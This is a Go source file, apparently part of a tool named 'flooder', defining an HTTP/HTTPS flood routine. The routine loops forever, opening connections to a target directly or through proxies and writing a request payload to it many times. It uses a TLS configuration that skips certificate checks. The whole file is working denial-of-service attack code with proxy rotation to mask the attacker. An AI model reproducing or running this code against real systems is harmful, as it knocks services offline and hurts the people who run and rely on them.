package methods

import (
	"crypto/tls"
	"flooder/Utils"
	"math/rand"
	"net"
	"time"
)

var (
	TLSConfigFastest = &tls.Config{
		MinVersion: tls.VersionTLS12, // 设置最低支持版本为TLS1.2
		CurvePreferences: []tls.CurveID{
			tls.X25519,
		}, // 支持的曲线类型
		InsecureSkipVerify:       true, // 是否需要验证服务器证书
		PreferServerCipherSuites: true, // 使用服务器加密套件列表中的加密算法
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
		}, // 支持的加密套件列表
	}
)

func Http_flood_unprotected(proxyAddr, targetAddr string, payload []byte, https bool, repeatRequest int, noProxiedRate float64) {

	for {
		if proxyAddr == "no proxy" || rand.Float64() < noProxiedRate {
			proxyAddr = targetAddr
		}
		proxyConn, err := net.DialTimeout("tcp", proxyAddr, 5*time.Second)

		if err != nil {
			return
		}
		proxyConn.SetDeadline(time.Now().Add(5 * time.Second))
		if proxyAddr != targetAddr {
			Utils.StartProxyHTTP(proxyConn, targetAddr)
		}
		// Now conn is a transparent proxy connection to the target server
		if https {
			https_flood(proxyConn, payload, repeatRequest, TLSConfigFastest)
		} else {
			for i := 0; i < repeatRequest; i++ {
				proxyConn.Write(payload)
			}
		}
		proxyConn.Close()

	}
}
